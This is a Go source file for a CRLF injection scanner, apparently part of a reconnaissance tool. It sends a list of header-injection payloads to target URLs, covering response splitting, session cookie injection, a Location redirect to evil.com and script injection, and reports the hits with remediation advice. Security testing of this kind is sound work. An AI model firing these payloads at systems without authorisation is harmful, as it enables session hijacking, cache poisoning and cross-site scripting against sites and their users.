package crlf

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"

	"github.com/a0x194/recon-hunter/internal/config"
	"github.com/a0x194/recon-hunter/internal/types"
	"github.com/a0x194/recon-hunter/internal/utils"
)

// CRLF injection payloads
var crlfPayloads = []struct {
	payload      string
	headerName   string
	headerValue  string
	description  string
}{
	// Basic CRLF
	{"%0d%0aX-Injected:header", "X-Injected", "header", "URL encoded CRLF"},
	{"%0aX-Injected:header", "X-Injected", "header", "URL encoded LF only"},
	{"%0dX-Injected:header", "X-Injected", "header", "URL encoded CR only"},

	// Double encoded
	{"%250d%250aX-Injected:header", "X-Injected", "header", "Double URL encoded CRLF"},
	{"%25250d%25250aX-Injected:header", "X-Injected", "header", "Triple URL encoded CRLF"},

	// Unicode variants
	{"%E5%98%8A%E5%98%8DX-Injected:header", "X-Injected", "header", "Unicode CRLF"},
	{"%u000aX-Injected:header", "X-Injected", "header", "Unicode LF"},
	{"%u000dX-Injected:header", "X-Injected", "header", "Unicode CR"},

	// Mixed encoding
	{"%0d%0a%20X-Injected:header", "X-Injected", "header", "CRLF with space"},
	{"%0d%0a%09X-Injected:header", "X-Injected", "header", "CRLF with tab"},

	// Multiple headers injection
	{"%0d%0aX-First:first%0d%0aX-Second:second", "X-First", "first", "Multiple headers"},

	// HTTP response splitting
	{"%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>injected</html>", "Content-Length", "0", "HTTP response splitting"},

	// Set-Cookie injection
	{"%0d%0aSet-Cookie:injected=true", "Set-Cookie", "injected=true", "Cookie injection"},
	{"%0d%0aSet-Cookie:session=hijacked;HttpOnly", "Set-Cookie", "session=hijacked", "Session cookie injection"},

	// Location header injection (open redirect via CRLF)
	{"%0d%0aLocation:https://evil.com", "Location", "https://evil.com", "Location header injection"},

	// Content-Type injection
	{"%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>", "Content-Type", "text/html", "Content-Type injection with XSS"},

	// X-XSS-Protection bypass
	{"%0d%0aX-XSS-Protection:0", "X-XSS-Protection", "0", "XSS protection bypass"},

	// Cache poisoning via CRLF
	{"%0d%0aX-Cache:HIT", "X-Cache", "HIT", "Cache header injection"},

	// Null byte variations
	{"%00%0d%0aX-Injected:header", "X-Injected", "header", "Null byte + CRLF"},
	{"%0d%00%0aX-Injected:header", "X-Injected", "header", "CR + Null + LF"},

	// UTF-8 encoded
	{"嘊嘍X-Injected:header", "X-Injected", "header", "UTF-8 CRLF characters"},

	// Continuation
	{"%0d%0a X-Injected:header", "X-Injected", "header", "Header continuation"},
	{"%0d%0a\tX-Injected:header", "X-Injected", "header", "Tab header continuation"},
}

// Scan performs CRLF injection scanning
func Scan(urls []string, cfg *config.Config) ([]types.VulnResult, error) {
	var results []types.VulnResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	// Client that doesn't follow redirects to detect Location header injection
	client := utils.HTTPClientNoRedirect(cfg.Timeout, cfg.Proxy)
	sem := make(chan struct{}, cfg.Threads)

	for _, urlStr := range urls {
		wg.Add(1)
		sem <- struct{}{}

		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			vulns := testCRLF(u, client)
			if len(vulns) > 0 {
				mu.Lock()
				results = append(results, vulns...)
				mu.Unlock()
			}
		}(urlStr)
	}

	wg.Wait()
	return results, nil
}

func testCRLF(urlStr string, client *http.Client) []types.VulnResult {
	var results []types.VulnResult

	// Test URL path injection
	for _, test := range crlfPayloads {
		result := testPathInjection(urlStr, test.payload, test.headerName, test.headerValue, test.description, client)
		if result != nil {
			results = append(results, *result)
			break // Found CRLF in path
		}
	}

	// Test parameter injection
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return results
	}

	if utils.HasParam(urlStr) {
		params := parsedURL.Query()
		for param := range params {
			for _, test := range crlfPayloads {
				result := testParamInjection(urlStr, param, test.payload, test.headerName, test.headerValue, test.description, client)
				if result != nil {
					results = append(results, *result)
					break
				}
			}
		}
	}

	return results
}

func testPathInjection(urlStr, payload, expectedHeader, expectedValue, description string, client *http.Client) *types.VulnResult {
	// Append payload to URL path
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return nil
	}

	testURL := urlStr + payload
	if strings.Contains(urlStr, "?") {
		// If URL has query string, inject in path before query
		testURL = parsedURL.Scheme + "://" + parsedURL.Host + parsedURL.Path + payload
		if parsedURL.RawQuery != "" {
			testURL += "?" + parsedURL.RawQuery
		}
	}

	return checkInjection(testURL, "", payload, expectedHeader, expectedValue, description, client)
}

func testParamInjection(urlStr, param, payload, expectedHeader, expectedValue, description string, client *http.Client) *types.VulnResult {
	parsedURL, _ := url.Parse(urlStr)
	originalParams := parsedURL.Query()
	originalValue := originalParams.Get(param)

	testParams := url.Values{}
	for k, v := range originalParams {
		testParams[k] = v
	}
	testParams.Set(param, originalValue+payload)

	parsedURL.RawQuery = testParams.Encode()
	testURL := parsedURL.String()

	return checkInjection(testURL, param, payload, expectedHeader, expectedValue, description, client)
}

func checkInjection(testURL, param, payload, expectedHeader, expectedValue, description string, client *http.Client) *types.VulnResult {
	resp, err := client.Get(testURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	// Check if injected header is present
	injectedValue := resp.Header.Get(expectedHeader)
	if injectedValue != "" {
		// Verify it contains our injected value
		if strings.Contains(injectedValue, expectedValue) || injectedValue == expectedValue {
			severity := "high"
			if expectedHeader == "Set-Cookie" || expectedHeader == "Location" || expectedHeader == "Content-Type" {
				severity = "critical"
			}

			evidence := fmt.Sprintf("Injected header '%s: %s' found in response", expectedHeader, injectedValue)
			if param != "" {
				evidence += fmt.Sprintf(" via parameter '%s'", param)
			}

			return &types.VulnResult{
				Type:        "CRLF Injection",
				Severity:    severity,
				URL:         testURL,
				Parameter:   param,
				Payload:     payload,
				Evidence:    evidence,
				Description: fmt.Sprintf("CRLF injection vulnerability. Technique: %s", description),
				Remediation: "Sanitize all user input before including in HTTP headers. Remove or encode CR (\\r) and LF (\\n) characters.",
				References: []string{
					"https://owasp.org/www-community/vulnerabilities/CRLF_Injection",
					"https://portswigger.net/kb/issues/00200190_http-response-header-injection",
				},
			}
		}
	}

	// Check for response splitting indicators
	if resp.StatusCode == 200 && strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
		// Could indicate successful Content-Type injection
		if strings.Contains(payload, "Content-Type") && strings.Contains(payload, "text/html") {
			return &types.VulnResult{
				Type:        "CRLF Injection - Potential Response Splitting",
				Severity:    "medium",
				URL:         testURL,
				Parameter:   param,
				Payload:     payload,
				Evidence:    "Response may be affected by CRLF injection. Manual verification required.",
				Description: fmt.Sprintf("Potential HTTP response splitting. Technique: %s", description),
				Remediation: "Sanitize all user input before including in HTTP headers.",
				References: []string{
					"https://owasp.org/www-community/attacks/HTTP_Response_Splitting",
				},
			}
		}
	}

	return nil
}
